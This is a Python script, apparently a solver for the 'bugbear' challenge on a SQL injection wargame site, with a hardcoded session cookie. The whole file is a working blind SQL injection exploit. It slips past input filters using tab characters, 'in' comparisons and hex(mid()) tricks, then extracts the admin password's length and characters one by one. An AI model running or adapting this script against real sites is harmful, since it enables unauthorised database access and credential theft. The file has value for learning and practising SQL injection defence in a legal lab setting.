from urllib.request import urlopen
import urllib
import requests

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"
session = dict(PHPSESSID = "6g7ncb5qgoqh53mb0vjtf0pn4b")

print ("! Start")

print ("! Find length of the password")

for i in range(0, 20):
	try:
		query = f"{url}no=1%09||%09id%09in%09(\"admin\")%09%26%26%09length(pw)%09in%09({i})%23"
		r = requests.post(query, cookies=session)
	except:
		print ("! Error")
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print ("! Found length : ", length)

print ("! Find password")

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = f"{url}no=1%09||%09id%09in%09(\"admin\")%26%26hex(mid(pw,{j},1))%09in%09(hex({i}))"
			r = requests.post(query, cookies=session)
		except:
			print ("! Error")
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print ("! pw " + str(j), ":", flag)
			break

print ("! Found pw : ", flag)
print ("! End")
